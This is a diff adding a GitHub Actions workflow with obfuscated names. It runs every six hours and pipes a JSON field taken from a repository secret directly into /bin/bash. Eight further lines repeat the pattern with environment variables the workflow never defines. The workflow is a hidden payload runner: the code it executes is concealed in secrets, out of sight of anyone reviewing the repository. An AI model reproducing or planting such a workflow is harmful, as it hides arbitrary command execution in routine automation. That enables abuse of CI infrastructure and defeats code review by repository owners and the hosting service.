@@ -1,0 +1,26 @@
+name: xu7anxa
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: xu7anxa
+        env:
+          e942: ${{ secrets.e942 }}
+        run: |
+          echo $e942 | jq -r .j70 | /bin/bash
+          echo $aolgt36 | jq -r .ncnew0 | /bin/bash
+          echo $bnf22 | jq -r .jc7144 | /bin/bash
+          echo $dod537 | jq -r .ckwxo94856 | /bin/bash
+          echo $r90 | jq -r .mgbmg1436 | /bin/bash
+          echo $bxy10821 | jq -r .jha5979 | /bin/bash
+          echo $gyklf54 | jq -r .kghn076 | /bin/bash
+          echo $aij7 | jq -r .r9537 | /bin/bash
+          echo $nybz541 | jq -r .rpyu65 | /bin/bash
+
